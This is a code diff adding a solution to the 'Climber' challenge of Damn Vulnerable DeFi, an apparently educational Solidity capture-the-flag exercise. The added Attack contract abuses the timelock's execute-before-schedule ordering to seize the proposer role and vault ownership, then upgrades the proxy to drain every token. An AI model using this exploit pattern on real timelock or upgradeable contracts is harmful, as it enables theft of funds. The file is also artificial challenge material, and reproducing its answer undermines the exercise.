@@ -7,6 +7,8 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +87,8 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        Attack attack = new Attack(vault, timelock, token, recovery);
+        attack.attack();
     }
 
     /**
@@ -94,5 +97,59 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract Attack {
+    // set timelock delay
+    // grant timelock as proposer
+    // change vault owner
+    // schedule
+    uint256 operationCount = 4;
+    address[] targets = new address[](operationCount);
+    bytes[] dataElements = new bytes[](operationCount);
+
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    DamnValuableToken token;
+    address recovery;
+    address player;
+
+    constructor(ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _recovery) {
+        vault = _vault;
+        timelock = _timelock;
+        token = _token;
+        recovery = _recovery;
+        player = msg.sender;
+    }
+
+    function attack() public {
+        targets[0] = address(timelock);
+        dataElements[0] = abi.encodeCall(timelock.updateDelay, (0));
+
+        targets[1] = address(timelock);
+        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(this)));
+
+        targets[2] = address(vault);
+        dataElements[2] = abi.encodeCall(vault.transferOwnership, (address(this)));
+
+        targets[3] = address(this);
+        dataElements[3] = abi.encodeCall(Attack.schedule, ());
+
+        timelock.execute(targets, new uint256[](operationCount), dataElements, 0);
+
+        vault.upgradeToAndCall(
+            address(new NewClimberVault()), abi.encodeCall(NewClimberVault.sweepFunds, (address(token), recovery))
+        );
+    }
+
+    function schedule() external {
+        timelock.schedule(targets, new uint256[](operationCount), dataElements, 0);
+    }
+}
+
+contract NewClimberVault is ClimberVault {
+    function sweepFunds(address token, address to) external {
+        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
     }
 }
